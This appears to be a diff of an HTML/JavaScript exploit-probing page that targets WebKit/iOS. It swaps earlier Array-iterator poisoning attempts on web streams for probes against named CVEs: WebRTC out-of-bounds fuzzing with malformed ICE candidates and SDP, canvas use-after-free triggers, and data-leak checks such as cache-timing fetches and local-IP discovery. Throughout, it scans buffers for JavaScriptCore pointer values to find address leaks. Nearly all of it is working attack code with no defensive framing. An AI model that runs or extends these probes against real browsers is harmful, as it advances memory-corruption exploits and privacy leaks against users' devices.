@@ -15,9 +15,10 @@ button:active{opacity:.7}
 </style></head><body>
 <div class="btns">
   <button onclick="runAll()">▶ Run All</button>
-  <button class="s" onclick="runProbe()">🔍 Probe Iterator</button>
-  <button class="s" onclick="runCorrupt()">💀 Corrupt Attempt</button>
-  <button class="s" onclick="runEscalate()">🚀 Escalate</button>
+  <button class="s" onclick="runWebRTCOOB()">📡 WebRTC OOB</button>
+  <button class="s" onclick="runCanvasUAF()">🎨 Canvas UAF</button>
+  <button class="s" onclick="runDataLeak()">💧 Data Leak</button>
+  <button class="s" onclick="runWebRTCSDP()">📋 SDP Extremes</button>
   <button class="cp" onclick="copyLog()">📋 Copy</button>
   <button class="s" onclick="clearLog()">🗑</button>
   <span id="copymsg">Copied!</span>
@@ -73,401 +74,451 @@ function chk(val,lbl){
   }
   return false;
 }
-
-var orig=Array.prototype[Symbol.iterator];
-
-// =====================================================
-// T1: VERIFY — Is the iterator actually called?
-// If iterator IS called + fake values processed = real bug
-// If iterator NOT called = just constructor ran normally
-// =====================================================
-async function runProbe(){
-  w('\n=== Iterator Call Probe ===\n','g');
-  info('Verifying iterator IS called during WS/RS construction');
-
-  // P1: Count iterator calls per constructor
-  var callCount=0;
-  var callLog=[];
-
-  Array.prototype[Symbol.iterator]=function(){
-    callCount++;
-    var context=new Error().stack.split('\n')[2]||'';
-    callLog.push('call#'+callCount+' ctx:'+context.trim().slice(0,60));
-    return orig.call(this);
-  };
-
-  callCount=0;callLog=[];
-  try{new WritableStream();}catch(e){}
-  info('WritableStream(): iterator called '+callCount+' times');
-  for(var i=0;i<callLog.length;i++) info('  '+callLog[i]);
-
-  callCount=0;callLog=[];
-  try{new ReadableStream();}catch(e){}
-  info('ReadableStream(): iterator called '+callCount+' times');
-  for(var i=0;i<callLog.length;i++) info('  '+callLog[i]);
-
-  callCount=0;callLog=[];
-  try{new TransformStream();}catch(e){}
-  info('TransformStream(): iterator called '+callCount+' times');
-
-  Array.prototype[Symbol.iterator]=orig;
-
-  // P2: Detect if WritableStream USES iterator values
-  info('\nP2: Does WritableStream USE the iterated values?');
-  var fakeCalled=false;
-  var fakeVal={IS_FAKE:true,fake_id:0xDEAD};
-
-  Array.prototype[Symbol.iterator]=function(){
-    var arr=this;
-    var realIter=orig.call(arr);
-    var idx=0;
-    return{next:function(){
-      var real=realIter.next();
-      if(!real.done&&idx===0){
-        fakeCalled=true;
-        idx++;
-        // Return fake for first element
-        return{value:fakeVal,done:false};
-      }
-      idx++;
-      return real;
-    }};
-  };
-
-  fakeCalled=false;
-  try{
-    var ws=new WritableStream({
-      start:function(ctrl){
-        info('WS.start called: ctrl type='+typeof ctrl);
-      },
-      write:function(chunk){
-        info('WS.write: chunk type='+typeof chunk);
-        if(chunk&&chunk.IS_FAKE) hit('WS processed FAKE chunk from iterator!');
-      }
-    });
-    info('WritableStream created, fakeCalled='+fakeCalled);
-    // Try to write and see if fake value shows up
-    var writer=ws.getWriter();
-    writer.write([1,2,3]).catch(function(){});
-    await new Promise(function(r){setTimeout(r,100);});
-  }catch(e){info('WS probe: '+e.name);}
-
-  Array.prototype[Symbol.iterator]=orig;
-
-  // P3: ReadableStream iterator detection
-  info('\nP3: Does ReadableStream USE the iterated values?');
-  var rsIterCalled=false;
-  Array.prototype[Symbol.iterator]=function(){
-    rsIterCalled=true;
-    var stack=new Error().stack;
-    info('RS iterator called from: '+stack.split('\n')[2].trim().slice(0,80));
-    return orig.call(this);
-  };
-
-  try{
-    var rs=new ReadableStream({
-      start:function(ctrl){
-        info('RS.start called');
-        ctrl.enqueue([10,20,30]);
-        ctrl.close();
-      }
-    });
-    var reader=rs.getReader();
-    var chunk=await reader.read();
-    info('RS chunk: '+JSON.stringify(chunk.value)+' iterCalled='+rsIterCalled);
-    // If the chunk was iterated, rsIterCalled = true
-    if(rsIterCalled) warn('RS iterator WAS called during enqueue/read!');
-    else info('RS iterator was NOT called (expected)');
-  }catch(e){info('RS probe: '+e.name);}
-
-  Array.prototype[Symbol.iterator]=orig;
-  ok('Probe done');
-  await new Promise(function(r){setTimeout(r,50);});
-}
-
-// =====================================================
-// T2: Attempt to actually corrupt via WS/RS iterator
-// Try to get type confusion into processed data
-// =====================================================
-async function runCorrupt(){
-  w('\n=== WritableStream/ReadableStream Corruption Attempt ===\n','g');
-
-  // C1: WritableStream with fake queuingStrategy via iterator
-  info('C1: WritableStream queuingStrategy via poisoned iterator...');
-
-  // WritableStream(underlyingSink, {size: fn, highWaterMark: N})
-  // size fn is called on each chunk — if we can replace it via iterator...
-  var sizeCalls=0;
-  var sizeArgs=[];
-
-  Array.prototype[Symbol.iterator]=function(){
-    var arr=this;
-    var i=0;
-    var realIter=orig.call(arr);
-    return{next:function(){
-      var real=realIter.next();
-      if(real.done) return real;
-      var val=real.value;
-      // Intercept — return evil queuingStrategy object
-      if(i===0&&typeof val==='object'&&val!==null&&'highWaterMark' in val){
-        val={
-          size:function(chunk){
-            sizeCalls++;
-            sizeArgs.push(chunk);
-            // Return a ptr-sized number
-            return 0x198ce6001; // near JSC __TEXT base
-          },
-          highWaterMark:1
-        };
-        warn('Substituted queuingStrategy via iterator at idx '+i);
-      }
-      i++;
-      return{value:val,done:false};
-    }};
-  };
-
-  try{
-    var ws2=new WritableStream(
-      {write:function(chunk){info('ws2.write: '+chunk.length+' bytes');}},
-      {size:function(c){return 1;},highWaterMark:16}
-    );
-    var wr2=ws2.getWriter();
-    await wr2.write(new Uint8Array(8).fill(0x41));
-    info('C1 sizeCalls='+sizeCalls+' sizeArgs='+sizeArgs.length);
-    if(sizeCalls>0) warn('Size function called! arg types: '+sizeArgs.map(function(a){return typeof a;}).join(', '));
-    await wr2.close();
-  }catch(e){info('C1: '+e.name+': '+e.message.slice(0,50));}
-
-  Array.prototype[Symbol.iterator]=orig;
-
-  // C2: ReadableStream pull via iterator confusion
-  info('C2: ReadableStream pull controller type confusion...');
-  var pullCount=0;
-  var pullTypes=[];
-
-  Array.prototype[Symbol.iterator]=function(){
-    var arr=this;
-    var i=0;
-    var realIter=orig.call(arr);
-    return{next:function(){
-      var real=realIter.next();
-      if(real.done) return real;
-      var val=real.value;
-      // Try to replace controller object
-      if(i===0&&val&&typeof val.enqueue==='function'){
-        warn('Intercepted RS controller via iterator!');
-        var origEnqueue=val.enqueue.bind(val);
-        val={
-          enqueue:function(chunk){
-            hit('Evil enqueue called with: '+typeof chunk);
-            return origEnqueue(chunk);
-          },
-          close:val.close.bind(val),
-          error:val.error.bind(val),
-          desiredSize:val.desiredSize
-        };
-      }
-      i++;
-      return{value:val,done:false};
-    }};
-  };
-
-  try{
-    var rs2=new ReadableStream({
-      start:function(ctrl){
-        pullCount++;
-        pullTypes.push(typeof ctrl);
-        ctrl.enqueue(new Uint8Array(4).fill(0x42));
-        ctrl.close();
-      }
-    });
-    var rd2=rs2.getReader();
-    var c2=await rd2.read();
-    info('C2: got chunk, pullTypes='+pullTypes.join(','));
-  }catch(e){info('C2: '+e.name);}
-
-  Array.prototype[Symbol.iterator]=orig;
-
-  // C3: from() constructor — ReadableStream.from() uses iterator!
-  info('C3: ReadableStream.from() with evil async iterator...');
-  if(typeof ReadableStream.from==='function'){
-    var leaked=[];
-    try{
-      var evilIter={
-        [Symbol.asyncIterator]:function(){
-          var i=0;
-          return{next:async function(){
-            if(i>=5) return{done:true};
-            // Yield giant/ptr-shaped values
-            var val=i===2?new ArrayBuffer(65536):new Uint8Array(8).fill(0x41+i);
-            i++;
-            return{value:val,done:false};
-          }};
-        }
-      };
-      var rs3=ReadableStream.from(evilIter);
-      var rd3=rs3.getReader();
-      for(var ri=0;ri<6;ri++){
-        var c3=await rd3.read();
-        if(c3.done) break;
-        if(c3.value instanceof ArrayBuffer){
-          warn('Got ArrayBuffer chunk: '+c3.value.byteLength+' bytes');
-          var u32=new Uint32Array(c3.value);
-          for(var ui=0;ui<u32.length-1;ui+=2){
-            var approx=u32[ui+1]*4294967296+u32[ui];
-            if(approx>=JSC_LO&&approx<=JSC_HI) hit('from() chunk leaked ptr at ['+ui+']');
-          }
-          leaked.push(c3.value.byteLength);
-        } else {
-          info('from() chunk['+ri+']: '+c3.value.length+' bytes');
-        }
-      }
-      ok('ReadableStream.from(): '+leaked.length+' ArrayBuffer chunks');
-    }catch(e){info('C3: '+e.name);}
-  } else {
-    info('ReadableStream.from() not available');
+function chkBuf(buf,lbl){
+  if(!buf||buf.byteLength<8) return 0;
+  var u32=new Uint32Array(buf),found=0;
+  for(var i=0;i<u32.length-1;i+=2){
+    var approx=u32[i+1]*4294967296+u32[i];
+    if(approx>=JSC_LO&&approx<=JSC_HI){hit('PTR '+lbl+'['+i+']: 0x'+approx.toString(16));found++;}
   }
+  return found;
+}
 
-  ok('Corruption attempts done');
+// =====================================================
+// T1: WebRTC OOB (CVE-2026-64718, Bugzilla 313935)
+// Component: WebRTC — OOB access in WebRTC code
+// Attack surface: RTCPeerConnection + ICE + SCTP + SRTP
+// =====================================================
+async function runWebRTCOOB(){
+  w('\n=== WebRTC OOB (CVE-2026-64718) ===\n','g');
+  info('Bugzilla 313935 — WebRTC OOB access, present in 26.5.2');
+
+  // W1: RTCDataChannel with extreme message sizes
+  info('W1: RTCDataChannel extreme messages...');
+  try{
+    var pc1=new RTCPeerConnection({iceServers:[]});
+    var pc2=new RTCPeerConnection({iceServers:[]});
+
+    // Setup ICE
+    pc1.onicecandidate=function(e){if(e.candidate)pc2.addIceCandidate(e.candidate).catch(function(){});};
+    pc2.onicecandidate=function(e){if(e.candidate)pc1.addIceCandidate(e.candidate).catch(function(){});};
+
+    // Create data channel
+    var dc1=pc1.createDataChannel('test',{ordered:false,maxRetransmits:0});
+    var dc2Ref=null;
+
+    pc2.ondatachannel=function(e){dc2Ref=e.channel;};
+
+    // Exchange SDP
+    var offer=await pc1.createOffer();
+    await pc1.setLocalDescription(offer);
+    await pc2.setRemoteDescription(offer);
+    var answer=await pc2.createAnswer();
+    await pc2.setLocalDescription(answer);
+    await pc1.setRemoteDescription(answer);
+
+    // Wait for channel to open
+    await new Promise(function(resolve){
+      dc1.onopen=resolve;
+      setTimeout(resolve,3000);
+    });
+
+    if(dc1.readyState==='open'){
+      ok('DataChannel open');
+
+      // Send extreme messages
+      var sizes=[1,100,65535,65536,1024*1024,4*1024*1024];
+      for(var si=0;si<sizes.length;si++){
+        try{
+          var msg=new Uint8Array(sizes[si]);
+          // Fill with ptr-like pattern to detect OOB read
+          var u32v=new Uint32Array(msg.buffer);
+          for(var i=0;i<u32v.length;i++) u32v[i]=0x41414141+si;
+
+          var T=performance.now();
+          dc1.send(msg);
+          var dt=performance.now()-T;
+          ok('send('+sizes[si]+'): '+dt.toFixed(0)+'ms');
+
+          // Check receive side
+          if(dc2Ref&&dc2Ref.readyState==='open'){
+            dc2Ref.onmessage=function(e){
+              if(e.data instanceof ArrayBuffer){
+                chkBuf(e.data,'RTCMsg_'+sizes[si]);
+              }
+            };
+          }
+        }catch(e){info('send('+sizes[si]+'): '+e.name);}
+      }
+      await new Promise(function(r){setTimeout(r,500);});
+    } else {
+      info('DataChannel not open: '+dc1.readyState);
+    }
+    pc1.close();pc2.close();
+  }catch(e){info('W1: '+e.name+': '+e.message.slice(0,60));}
+
+  // W2: SCTP stream ID extremes
+  info('\nW2: SCTP stream ID extremes...');
+  try{
+    var pc3=new RTCPeerConnection({iceServers:[]});
+    var extremeStreamIds=[0,1,65534,65535,65536,0xFFFF,0x10000];
+    for(var ei=0;ei<extremeStreamIds.length;ei++){
+      try{
+        var dc=pc3.createDataChannel('ch'+ei,{
+          id:extremeStreamIds[ei],
+          negotiated:true
+        });
+        info('SCTP stream id='+extremeStreamIds[ei]+': '+dc.readyState);
+      }catch(e){info('SCTP id='+extremeStreamIds[ei]+': '+e.name);}
+    }
+    pc3.close();
+  }catch(e){info('W2: '+e.name);}
+
+  // W3: ICE candidate with extreme values
+  info('\nW3: ICE candidate injection...');
+  try{
+    var pc4=new RTCPeerConnection({iceServers:[]});
+    var pc5=new RTCPeerConnection({iceServers:[]});
+    pc4.createDataChannel('x');
+    var offer2=await pc4.createOffer();
+    await pc4.setLocalDescription(offer2);
+    await pc5.setRemoteDescription(offer2);
+
+    // Inject malformed ICE candidates
+    var malformedCandidates=[
+      // OOB port number
+      'candidate:1 1 UDP 2130706431 192.168.1.1 99999 typ host',
+      // Negative priority
+      'candidate:1 1 UDP 4294967295 192.168.1.1 9999 typ host',
+      // Huge foundation (string OOB?)
+      'candidate:'+('A'.repeat(1024))+' 1 UDP 1 127.0.0.1 1234 typ host',
+      // Empty foundation
+      'candidate: 1 UDP 1 127.0.0.1 1234 typ host',
+      // Overflow component
+      'candidate:1 65535 UDP 1 127.0.0.1 1234 typ host',
+    ];
+
+    for(var mi=0;mi<malformedCandidates.length;mi++){
+      try{
+        await pc5.addIceCandidate({
+          candidate:malformedCandidates[mi],
+          sdpMid:'0',
+          sdpMLineIndex:0
+        });
+        warn('Malformed ICE['+mi+']: accepted!');
+      }catch(e){info('ICE['+mi+']: '+e.name);}
+    }
+    pc4.close();pc5.close();
+  }catch(e){info('W3: '+e.name);}
+
+  ok('WebRTC OOB done');
   await new Promise(function(r){setTimeout(r,50);});
 }
 
 // =====================================================
-// T3: Escalate — if iterator IS being used by WS/RS
-// try to get a measurable type confusion
+// T2: Canvas UAF (CVE-2026-43821, Bugzilla 314867)
+// Use-after-free in WebKit Canvas operations
 // =====================================================
-async function runEscalate(){
-  w('\n=== Escalation Attempt ===\n','g');
+async function runCanvasUAF(){
+  w('\n=== Canvas UAF (CVE-2026-43821) ===\n','g');
+  info('Bugzilla 314867 — WebKit Canvas UAF, present in 26.5.2');
 
-  // E1: Structured clone via stream — does it preserve type?
-  info('E1: postMessage/structuredClone with stream data...');
-  try{
-    var buf=new ArrayBuffer(64);
-    new Uint32Array(buf).fill(0x41414141);
-
-    var rs4=new ReadableStream({
-      start:function(c){c.enqueue(buf);c.close();}
-    });
-
-    // structuredClone of buf
-    var cloned=structuredClone(buf);
-    var u32c=new Uint32Array(cloned);
-    info('Cloned buf[0]: 0x'+u32c[0].toString(16));
-    for(var ci=0;ci<u32c.length-1;ci+=2){
-      var approx=u32c[ci+1]*4294967296+u32c[ci];
-      if(approx>=JSC_LO&&approx<=JSC_HI) hit('structuredClone leaked ptr!');
-    }
-
-    var rd4=rs4.getReader();
-    var ch4=await rd4.read();
-    if(ch4.value instanceof ArrayBuffer){
-      var u32d=new Uint32Array(ch4.value);
-      for(var di=0;di<u32d.length-1;di+=2){
-        var approx2=u32d[di+1]*4294967296+u32d[di];
-        if(approx2>=JSC_LO&&approx2<=JSC_HI) hit('Stream chunk leaked ptr!');
-      }
-      ok('Stream chunk: '+ch4.value.byteLength+' bytes, clean');
-    }
-  }catch(e){info('E1: '+e.name);}
-
-  // E2: BYOB reader with WritableStream
-  info('E2: BYOB reader type confusion...');
-  try{
-    var rs5=new ReadableStream({
-      type:'bytes',
-      start:function(c){
-        // Fill with known pattern
-        var view=new Uint8Array(256);
-        for(var i=0;i<256;i++) view[i]=i;
-        c.enqueue(view);
-        c.close();
-      }
-    });
-
-    var rd5=rs5.getReader({mode:'byob'});
-    var destBuf=new Uint8Array(256);
-    var result=await rd5.read(destBuf);
-    info('BYOB read: '+result.value.length+' bytes');
-
-    var u32e=new Uint32Array(result.value.buffer);
-    for(var ei=0;ei<u32e.length-1;ei+=2){
-      var approx3=u32e[ei+1]*4294967296+u32e[ei];
-      if(approx3>=JSC_LO&&approx3<=JSC_HI) hit('BYOB read leaked ptr at ['+ei+']!');
-    }
-
-    // Try to get OOB via BYOB with too-small buffer
-    var smallBuf=new Uint8Array(4);
+  // CU1: Rapid canvas creation/destruction while drawing
+  info('CU1: Canvas create/destroy during draw operations...');
+  var leaks=[];
+  for(var i=0;i<50;i++){
     try{
-      var rs6=new ReadableStream({
-        type:'bytes',
-        start:function(c){
-          var big=new Uint8Array(256);
-          for(var i=0;i<256;i++) big[i]=0xAB;
-          c.enqueue(big);c.close();
-        }
-      });
-      var rd6=rs6.getReader({mode:'byob'});
-      var res6=await rd6.read(smallBuf);
-      info('BYOB small buf read: '+res6.value.length+' bytes (buf was 4)');
-      if(res6.value.length>4) hit('BYOB OOB: read '+res6.value.length+' into 4-byte buffer!');
-    }catch(e){info('BYOB small: '+e.name);}
+      var canvas=document.createElement('canvas');
+      canvas.width=256;canvas.height=256;
+      var ctx=canvas.getContext('2d');
 
-  }catch(e){info('E2: '+e.name);}
+      // Start drawing operations
+      ctx.fillStyle='rgba(222,173,190,0.5)';
+      ctx.fillRect(0,0,256,256);
+      ctx.beginPath();
+      ctx.arc(128,128,128,0,Math.PI*2);
+      ctx.fill();
 
-  // E3: Transfer WritableStream via structuredClone
-  info('E3: structuredClone WritableStream...');
-  try{
-    var ws3=new WritableStream({write:function(c){info('ws3 write: '+c);}});
-    var clonedWS=structuredClone(ws3,{transfer:[ws3]});
-    info('Cloned WritableStream: locked='+ws3.locked);
-    hit('WritableStream structuredClone succeeded — transferred!');
-    var writer3=clonedWS.getWriter();
-    writer3.write(new Uint8Array(8).fill(0xCC));
-    await writer3.close();
-  }catch(e){info('E3 WS clone: '+e.name);}
+      // Get ImageData WHILE draw is potentially in flight
+      var imgData=ctx.getImageData(0,0,256,256);
 
-  // E4: Multiple concurrent pipeThrough to same writable
-  info('E4: Multiple readers/writers race...');
-  try{
-    var sharedBuf=new SharedArrayBuffer(1024);
-    var sharedView=new Uint32Array(sharedBuf);
-    sharedView.fill(0xDEADBEEF);
+      // Now destroy canvas by removing all references
+      ctx=null;
+      canvas.width=0;canvas.height=0; // forces reallocation
 
-    // Create two streams writing to same underlying buffer
-    var ws4=new WritableStream({
-      write:function(chunk){
-        var u32=new Uint32Array(chunk.buffer||new ArrayBuffer(0));
-        for(var i=0;i<u32.length-1;i+=2){
-          var approx=u32[i+1]*4294967296+u32[i];
-          if(approx>=JSC_LO&&approx<=JSC_HI) hit('WritableStream chunk has ptr!');
+      // Check the (now potentially freed) imgData
+      var u32=new Uint32Array(imgData.data.buffer);
+      var ptrs=0;
+      for(var pi=0;pi<u32.length-1;pi+=2){
+        var approx=u32[pi+1]*4294967296+u32[pi];
+        if(approx>=JSC_LO&&approx<=JSC_HI){hit('Canvas UAF['+i+']: PTR in freed imageData!');ptrs++;}
+      }
+      if(ptrs>0) leaks.push({iter:i,ptrs:ptrs});
+
+      // Check if non-black/transparent pixels appeared
+      var unexpected=0;
+      for(var di=0;di<u32.length;di++){
+        var v=u32[di];
+        if(v!==0&&v!==0xFF000000&&v!==0xBEADDE00){
+          unexpected++;
         }
       }
-    });
+      if(unexpected>1000) warn('Canvas UAF['+i+']: '+unexpected+' unexpected pixels');
 
-    var rs7=new ReadableStream({
-      start:function(c){
-        // Enqueue SharedArrayBuffer view
-        c.enqueue(new Uint8Array(sharedBuf,0,256));
-        c.enqueue(new Uint8Array(sharedBuf,256,256));
-        c.close();
+      canvas=null;
+    }catch(e){}
+  }
+  ok('CU1: '+leaks.length+'/50 had ptrs');
+
+  // CU2: OffscreenCanvas transfer race
+  info('\nCU2: OffscreenCanvas transfer UAF...');
+  try{
+    for(var j=0;j<30;j++){
+      var oc=new OffscreenCanvas(256,256);
+      var octx=oc.getContext('2d');
+      octx.fillStyle='red';
+      octx.fillRect(0,0,256,256);
+
+      // Get image data before transfer
+      var imgBefore=octx.getImageData(0,0,256,256);
+
+      // Transfer OffscreenCanvas to worker (detaches it)
+      // We can't easily do worker here, but we can use
+      // createImageBitmap on the transferring canvas
+      var bitmap=await createImageBitmap(oc);
+
+      // The octx should now be invalid (transferred)
+      try{
+        // Try to use octx after bitmap creation (UAF?)
+        octx.fillStyle='blue';
+        octx.fillRect(0,0,128,128);
+        var imgAfter=octx.getImageData(0,0,256,256);
+        var u32a=new Uint32Array(imgAfter.data.buffer);
+        var ptrs2=0;
+        for(var pi2=0;pi2<u32a.length-1;pi2+=2){
+          var approx2=u32a[pi2+1]*4294967296+u32a[pi2];
+          if(approx2>=JSC_LO&&approx2<=JSC_HI){hit('OffscreenCanvas UAF['+j+']: PTR!');ptrs2++;}
+        }
+        if(ptrs2===0&&imgAfter.data[0]!==0){
+          // Canvas still accessible — not UAF but maybe data leak
+          var blueFound=0;
+          for(var k=0;k<u32a.length;k++) if(u32a[k]===0xFF0000FF||u32a[k]===0xFFFF0000) blueFound++;
+        }
+      }catch(e){info('After transfer octx use: '+e.name);}
+      bitmap.close();
+    }
+  }catch(e){info('CU2: '+e.name);}
+
+  // CU3: Canvas context 2D image pattern UAF
+  info('\nCU3: Canvas pattern from freed image...');
+  try{
+    for(var k=0;k<20;k++){
+      var srcCanvas=document.createElement('canvas');
+      srcCanvas.width=64;srcCanvas.height=64;
+      var srcCtx=srcCanvas.getContext('2d');
+      srcCtx.fillStyle='rgb(222,173,190)';
+      srcCtx.fillRect(0,0,64,64);
+
+      // Create pattern FROM srcCanvas
+      var dstCanvas=document.createElement('canvas');
+      dstCanvas.width=256;dstCanvas.height=256;
+      var dstCtx=dstCanvas.getContext('2d');
+      var pattern=dstCtx.createPattern(srcCanvas,'repeat');
+
+      // Destroy srcCanvas while pattern holds reference
+      srcCanvas.width=0;srcCanvas.height=0;
+      srcCtx=null;srcCanvas=null;
+
+      // Use the pattern (UAF: pattern references freed canvas data)
+      dstCtx.fillStyle=pattern;
+      dstCtx.fillRect(0,0,256,256);
+
+      var img=dstCtx.getImageData(0,0,256,256);
+      var u32p=new Uint32Array(img.data.buffer);
+      var ptrs3=chkBuf(img.data.buffer,'CanvasPattern_'+k);
+      if(ptrs3>0) hit('Canvas pattern UAF['+k+']: PTR in pattern output!');
+
+      // Check for non-pattern values (freed heap content)
+      var nonPattern=u32p.filter(function(v){return v!==0&&v!==0xBEADDE00&&v!==0xFF000000;}).length;
+      if(nonPattern>0&&k<3) info('CU3['+k+']: '+nonPattern+' non-pattern pixels');
+
+      dstCanvas=null;pattern=null;
+    }
+    ok('CU3 done');
+  }catch(e){info('CU3: '+e.name);}
+
+  ok('Canvas UAF done');
+  await new Promise(function(r){setTimeout(r,50);});
+}
+
+// =====================================================
+// T3: Data Leak (CVE-2026-64778)
+// "Visiting a maliciously crafted website may leak sensitive data"
+// Probe various info disclosure channels
+// =====================================================
+async function runDataLeak(){
+  w('\n=== Data Leak Probe (CVE-2026-64778) ===\n','g');
+  info('CVE-2026-64778: website may leak sensitive data');
+  info('Probing: navigation timing, performance, storage info');
+
+  // DL1: Navigation timing
+  info('DL1: Navigation timing precision...');
+  try{
+    var nt=performance.getEntriesByType('navigation')[0];
+    if(nt){
+      var times=['startTime','redirectStart','redirectEnd','fetchStart',
+                  'domainLookupStart','domainLookupEnd','connectStart',
+                  'secureConnectionStart','connectEnd','requestStart',
+                  'responseStart','responseEnd','domInteractive',
+                  'domContentLoadedEventStart','domContentLoadedEventEnd',
+                  'domComplete','loadEventStart','loadEventEnd'];
+      for(var ti=0;ti<times.length;ti++){
+        var v=nt[times[ti]];
+        if(v!==0) info(times[ti]+': '+v.toFixed(3));
+        chk(v,'NavTiming_'+times[ti]);
       }
+    }
+  }catch(e){info('DL1: '+e.name);}
+
+  // DL2: Storage quota estimates
+  info('\nDL2: Storage quota estimates...');
+  try{
+    var est=await navigator.storage.estimate();
+    ok('Storage estimate: usage='+est.usage+' quota='+est.quota);
+    chk(est.usage,'StorageUsage');chk(est.quota,'StorageQuota');
+  }catch(e){info('DL2: '+e.name);}
+
+  // DL3: Cross-origin iframe timing oracle
+  info('\nDL3: Same-site cookie leak via timing...');
+  try{
+    // Check if cache timing exposes visited links
+    var urlsToCheck=['https://apple.com','https://google.com'];
+    for(var ui=0;ui<urlsToCheck.length;ui++){
+      var T=performance.now();
+      try{
+        var resp=await fetch(urlsToCheck[ui],{mode:'no-cors',cache:'force-cache'});
+        var dt=performance.now()-T;
+        info('fetch('+urlsToCheck[ui].slice(8,20)+'): '+dt.toFixed(0)+'ms — cache hint');
+        chk(dt,'FetchTiming_'+ui);
+      }catch(e){info('fetch('+urlsToCheck[ui].slice(8,20)+'): '+e.name);}
+    }
+  }catch(e){info('DL3: '+e.name);}
+
+  // DL4: WebRTC IP leak
+  info('\nDL4: WebRTC local IP discovery...');
+  try{
+    var pc=new RTCPeerConnection({iceServers:[]});
+    pc.createDataChannel('x');
+    var offer=await pc.createOffer();
+    await pc.setLocalDescription(offer);
+    var candidates=[];
+    await new Promise(function(resolve){
+      pc.onicecandidate=function(e){
+        if(e.candidate){
+          var parts=e.candidate.candidate.split(' ');
+          if(parts[7]==='host') candidates.push(parts[4]);
+        } else resolve();
+      };
+      setTimeout(resolve,2000);
     });
+    ok('Local IPs via WebRTC: '+candidates.join(', '));
+    pc.close();
+  }catch(e){info('DL4: '+e.name);}
 
-    await rs7.pipeTo(ws4);
-    ok('E4 pipeTo completed');
-  }catch(e){info('E4: '+e.name);}
+  // DL5: Performance memory (if available)
+  info('\nDL5: performance.memory...');
+  if(performance.memory){
+    ok('jsHeapSizeLimit: '+performance.memory.jsHeapSizeLimit);
+    ok('totalJSHeapSize: '+performance.memory.totalJSHeapSize);
+    ok('usedJSHeapSize: '+performance.memory.usedJSHeapSize);
+    chk(performance.memory.usedJSHeapSize,'JSHeapUsed');
+    chk(performance.memory.totalJSHeapSize,'JSHeapTotal');
+  } else info('performance.memory not available');
 
-  ok('Escalation done. Check Analytics.');
+  ok('Data leak probe done');
+  await new Promise(function(r){setTimeout(r,50);});
+}
+
+// =====================================================
+// T4: SDP extremes — target the WebRTC OOB
+// The OOB is in WebRTC parsing of SDP or ICE data
+// Fuzz SDP with extreme values
+// =====================================================
+async function runWebRTCSDP(){
+  w('\n=== SDP Extreme Fuzzing ===\n','g');
+  info('Fuzzing SDP to trigger WebRTC OOB (Bugzilla 313935)');
+
+  // Build malformed SDP
+  var baseSDP='v=0\r\n'+
+    'o=- 123456789 123456789 IN IP4 127.0.0.1\r\n'+
+    's=-\r\n'+
+    't=0 0\r\n'+
+    'a=group:BUNDLE 0\r\n'+
+    'm=application 9 UDP/DTLS/SCTP webrtc-datachannel\r\n'+
+    'c=IN IP4 0.0.0.0\r\n'+
+    'a=ice-ufrag:abcd\r\n'+
+    'a=ice-pwd:abcdefghijklmnopqrstuvwx\r\n'+
+    'a=fingerprint:sha-256 AA:BB:CC:DD:EE:FF:00:11:22:33:44:55:66:77:88:99:AA:BB:CC:DD:EE:FF:00:11:22:33:44:55:66:77:88:99\r\n'+
+    'a=setup:actpass\r\n'+
+    'a=mid:0\r\n'+
+    'a=sctp-port:5000\r\n'+
+    'a=max-message-size:262144\r\n';
+
+  // SDP variant tests
+  var sdpTests=[
+    {name:'extreme sctp-port',        mod:function(s){return s.replace('5000','99999');}},
+    {name:'huge max-message-size',     mod:function(s){return s.replace('262144','4294967295');}},
+    {name:'negative max-msg-size',     mod:function(s){return s.replace('262144','-1');}},
+    {name:'overflow max-msg-size',     mod:function(s){return s.replace('262144','18446744073709551615');}},
+    {name:'long ice-ufrag',            mod:function(s){return s.replace('abcd','a'.repeat(65535));}},
+    {name:'long ice-pwd',              mod:function(s){return s.replace('abcdefghijklmnopqrstuvwx','a'.repeat(65535));}},
+    {name:'NaN max-message-size',      mod:function(s){return s.replace('262144','NaN');}},
+    {name:'extra media sections ×100', mod:function(s){
+      var extra='m=application 9 UDP/DTLS/SCTP webrtc-datachannel\r\nc=IN IP4 0.0.0.0\r\na=mid:X\r\n';
+      return s+extra.repeat(100);
+    }},
+  ];
+
+  for(var ti=0;ti<sdpTests.length;ti++){
+    var t=sdpTests[ti];
+    try{
+      var pc6=new RTCPeerConnection({iceServers:[]});
+      var pc7=new RTCPeerConnection({iceServers:[]});
+      pc6.createDataChannel('x');
+
+      var offer3=await pc6.createOffer();
+      // Inject modified SDP
+      var modifiedSDP=t.mod(offer3.sdp);
+
+      try{
+        await pc6.setLocalDescription({type:'offer',sdp:modifiedSDP});
+        await pc7.setRemoteDescription({type:'offer',sdp:modifiedSDP});
+        ok('SDP['+t.name+']: setRemoteDescription accepted!');
+        // Try to get answer
+        var ans=await pc7.createAnswer();
+        await pc7.setLocalDescription(ans);
+        ok('  → answer created');
+      }catch(e){
+        info('SDP['+t.name+']: '+e.name+': '+e.message.slice(0,50));
+      }
+      pc6.close();pc7.close();
+    }catch(e){info('SDP['+t.name+']: outer '+e.name);}
+    await new Promise(function(r){setTimeout(r,100);});
+  }
+  ok('SDP fuzzing done. Check Analytics.');
 }
 
 async function runAll(){
   clearLog();
-  w('=== WritableStream/ReadableStream Iterator Confusion ===\n','g');
-  w('[!!!] Both accepted poisoned Array iterator — verifying now\n','r');
-  await runProbe();
-  await runCorrupt();
-  await runEscalate();
+  w('=== WebRTC OOB + Canvas UAF + Data Leak ===\n','g');
+  w('[*] CVE-2026-64718 (WebRTC) + CVE-2026-43821 (Canvas) + CVE-2026-64778\n','d');
+  w('[*] All present in iOS 26.5.2, fixed in 26.6\n','d');
+  await runWebRTCOOB();
+  await runCanvasUAF();
+  await runDataLeak();
+  await runWebRTCSDP();
   w('\nDone. Check Analytics.\n','g');
 }
 </script>
 </body></html>
+EOF
